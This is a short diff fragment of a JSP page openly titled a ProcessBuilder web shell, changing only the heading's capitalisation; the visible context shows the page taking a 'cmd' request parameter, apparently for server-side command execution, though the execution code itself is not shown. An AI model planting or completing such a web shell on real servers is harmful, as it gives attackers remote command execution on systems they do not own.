@@ -3,7 +3,7 @@
 <%@ page import="java.io.InputStreamReader" %>
 <html>
 <body>
-<h2>java.lang.ProcessBuilder JSP Webshell</h2>
+<h2>java.lang.ProcessBuilder JSP WebShell</h2>
 <%
     try {
         final String s = request.getParameter("cmd");
